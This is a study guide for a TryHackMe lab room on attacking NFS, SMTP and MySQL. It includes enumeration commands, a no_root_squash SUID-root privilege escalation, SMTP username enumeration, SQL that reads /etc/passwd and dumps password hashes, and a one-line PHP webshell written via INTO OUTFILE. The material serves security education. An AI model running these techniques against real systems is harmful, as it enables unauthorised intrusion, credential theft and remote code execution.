# Network Services 2 — Full Study Guide

Source module: TryHackMe "Network Exploitation Basics" → Room: Network Services 2

The follow-up to Network Services, covering three more extremely common real-world services: **NFS**, **SMTP**, and **MySQL**. Same methodology as before — enumerate exhaustively, identify exact versions/configuration, then exploit misconfigurations or known weaknesses.

---

## 1. NFS (Network File System)

### What it is

NFS is Unix/Linux's native protocol for sharing directories over a network so a remote machine can mount them as if they were local. Port: **2049/TCP** (modern NFSv4; older versions also used the RPC portmapper on **111/TCP/UDP**, which dynamically assigned NFS-related service ports).

### Why it matters for security

NFS's access control model, especially in NFSv3, is fundamentally weaker than a login-based service: by default it trusts the **client's claimed UID/GID** (user/group ID numbers) rather than requiring a username/password. This means if you can get your own Linux user's UID to match a UID that has access on the server (including UID 0 = root, if `no_root_squash` is set — see below), NFS will simply grant you that access. It's a trust-the-network model, not a trust-nothing model.

### Enumeration

**Nmap:**
```
nmap -p 111,2049 -sV -sC <target>
nmap --script nfs-showmount,nfs-ls <target>
```

**showmount** — the classic tool for listing what a server is exporting and to whom:
```
showmount -e <target>
```
`-e` shows the export list: each shared directory and which hosts/networks are permitted to mount it (often `*`, meaning anyone).

### Mounting a share

```
mkdir /mnt/nfs
sudo mount -t nfs <target>:/exported/path /mnt/nfs -o nolock
```
Once mounted, browse it exactly like a local directory: `ls -la /mnt/nfs`.

### The critical misconfiguration: `no_root_squash`

By default, NFS applies **root squashing**: if a client claims to be UID 0 (root) when accessing a share, the server "squashes" that identity down to an anonymous/unprivileged user, specifically to prevent a client's root user from acting as root on the server's files. If an export is configured with the `no_root_squash` option (visible in the server's `/etc/exports` file, or inferable if your locally-created files on the mount show up owned by `root`), that protection is disabled — **your local root user is treated as root on the NFS share too.**

**Exploitation path** (the room's signature technique): if `no_root_squash` is set and you have local root on your attacking machine (trivial in a VM), you can:
1. Mount the share.
2. As root locally, create a binary on the share, set the **SUID bit** on it, and make it owned by root (e.g. a simple C program that calls `setuid(0); system("/bin/bash");` or copies `/bin/bash` and sets SUID).
3. If that share is also accessible from the target's own filesystem (e.g. it's a shared directory the target machine itself can execute files from) or you can get a lower-privileged shell on the target through another route and then execute that file from the mount, the SUID-root binary runs as root there too — an immediate privilege escalation to root, entirely because the NFS trust model let you plant a root-owned SUID file from outside.

This is one of the clearest illustrations in the whole module of why UID-based trust (instead of authenticated trust) is dangerous.

---

## 2. SMTP (Simple Mail Transfer Protocol)

### What it is

SMTP is the protocol mail servers use to send and relay email. Port: **25/TCP** (also 587 for submission, 465 for SMTPS — this room focuses on 25).

### Why it matters for security

Many SMTP servers, especially older or default-configured ones, support commands intended for administrative/debugging use that also happen to be a **user enumeration oracle**: you can ask the server "does this mailbox exist?" and get a different, distinguishable response for valid vs invalid usernames — without ever needing a password. That converts a mail server into a tool for building a list of valid usernames to then brute-force against SSH, FTP, or a web login elsewhere.

### Enumeration

**Nmap:**
```
nmap -p 25 -sV -sC --script smtp-commands,smtp-enum-users,smtp-open-relay <target>
```
`smtp-commands` lists what the server supports (its EHLO response); `smtp-enum-users` attempts the enumeration described below automatically; `smtp-open-relay` checks whether the server will relay mail for anyone (another classic misconfiguration, historically abused for spam).

**Manual interaction** (via `telnet <target> 25` or `nc <target> 25`), using the raw SMTP commands:

| Command | Purpose |
|---|---|
| `HELO`/`EHLO <domain>` | Opens the session, identifies your client |
| `MAIL FROM:<addr>` | Declares the sender |
| `RCPT TO:<addr>` | Declares the recipient |
| `DATA` | Begin the message body, terminated with a line containing just `.` |
| `VRFY <user>` | **Verify** — asks the server to confirm whether a mailbox/user exists |
| `EXPN <list>` | **Expand** — asks the server to expand a mailing list into its member addresses |

**The enumeration trick**: `VRFY root` on a server where `root` exists typically returns `250` (OK, with the full address) while `VRFY nonexistentuser1234` returns `550` (No such user) — a directly observable difference you can automate. The tool built specifically for this is:
```
smtp-user-enum -M VRFY -U userlist.txt -t <target>
```
`-M` picks the enumeration method (`VRFY`, `EXPN`, or `RCPT`, since not all servers support all three — a well-hardened server disables `VRFY`/`EXPN` entirely and you fall back to watching `RCPT TO` responses during a fake mail transaction instead), `-U` is a username wordlist to test, `-t` is the target.

### Outcome

SMTP enumeration by itself isn't "exploitation" — it's reconnaissance that produces a validated username list, which then feeds directly into brute-forcing other services (SSH, FTP, a web login) covered elsewhere in the module. This is a good example of how enumeration on one service supports an attack on a completely different one.

---

## 3. MySQL

### What it is

MySQL is one of the most widely deployed relational database systems, frequently sitting behind web applications. Port: **3306/TCP**.

### Why it matters for security

Two extremely common real-world failures show up constantly: **default or blank credentials** (classic misconfiguration: `root` with no password, or bound to `0.0.0.0` and reachable remotely when it should be localhost-only), and, once you have any authenticated access with sufficient privileges, the ability to **read and write arbitrary files** on the host via built-in SQL functions — turning "I have DB access" into "I have a shell."

### Enumeration

**Nmap:**
```
nmap -p 3306 -sV -sC --script mysql-info,mysql-enum-users,mysql-empty-password <target>
```
`mysql-info` grabs the version/protocol banner; `mysql-empty-password` specifically checks whether accounts (notably `root`) accept a blank password.

**Manual connection with the MySQL client:**
```
mysql -h <target> -u root -p
```
Try a blank password first (just press Enter at the prompt), then common weak passwords, then feed credentials found elsewhere in the box/engagement.

Once connected, standard enumeration SQL:
```sql
SHOW DATABASES;
USE <database>;
SHOW TABLES;
SELECT * FROM <table>;
SELECT user,authentication_string FROM mysql.user;  -- often reveals password hashes if you have privilege
```

### Exploitation

Two angles this room teaches:

1. **Reading arbitrary files** — if the connected account has the `FILE` privilege and `secure_file_priv` isn't restrictively configured, you can read files off the underlying OS directly through SQL:
```sql
SELECT LOAD_FILE('/etc/passwd');
```
This is a direct information-disclosure primitive straight out of a database connection.

2. **Writing a file / gaining code execution** — with `FILE` privilege and a permissive `secure_file_priv`, you can write to disk:
```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```
If the MySQL server and a web server share the same filesystem and the web root is writable this way, this drops a webshell you then hit over HTTP for full command execution — turning database access into remote code execution on the host. (A more advanced variant taught at this level in some walkthroughs is abusing **UDF — User Defined Functions** — to load a custom shared library that executes OS commands directly from SQL, when `FILE` privilege plus write access to the plugin directory is available; this is the deeper, more reliable RCE technique where webroot-sharing isn't available.)

---

## 4. Combined port/tooling reference (Network Services + Network Services 2)

| Service | Port(s) | Key enum tool | Exploitation pattern |
|---|---|---|---|
| FTP | 21 | `nmap ftp-anon`, `ftp` client | Anonymous login; Hydra brute force; version backdoors |
| Telnet | 23 | `nmap -sV`, `telnet` | Default/weak creds via Hydra |
| SMTP | 25 | `smtp-user-enum`, manual `VRFY`/`EXPN`/`RCPT` | User enumeration → feeds brute force elsewhere |
| RPC portmapper | 111 | `rpcinfo`, `nmap` | Reveals dynamically assigned service ports (incl. NFS) |
| SMB | 139, 445 | `enum4linux`, `smbclient`, `smbmap`, `nmap smb-*` | Open shares; version CVEs (e.g. usermap_script) |
| MySQL | 3306 | `mysql` client, `nmap mysql-*` | Blank/weak root creds; `LOAD_FILE`/`INTO OUTFILE`; UDF RCE |
| NFS | 2049 | `showmount -e`, `mount` | `no_root_squash` → SUID binary → root privesc |

---

## Key takeaways

NFS demonstrates the risk of trust based purely on a client-asserted identity (UID) rather than authentication. SMTP demonstrates how a protocol's legitimate debugging commands (`VRFY`/`EXPN`) become an enumeration oracle, and how recon on one service enables an attack on another. MySQL demonstrates the very common path from weak/default database credentials, through built-in file read/write functions, to full remote code execution on the underlying host. Across both Network Services rooms, the pattern never changes: Nmap identifies and version-fingerprints the service, a service-specific tool enumerates everything available without credentials, and exploitation nearly always comes down to either a known version-specific vulnerability or a basic misconfiguration (anonymous access, default creds, an overly trusting permission model) — not exotic zero-days. In real-world assessments, these "boring" misconfigurations are overwhelmingly the most common way in.
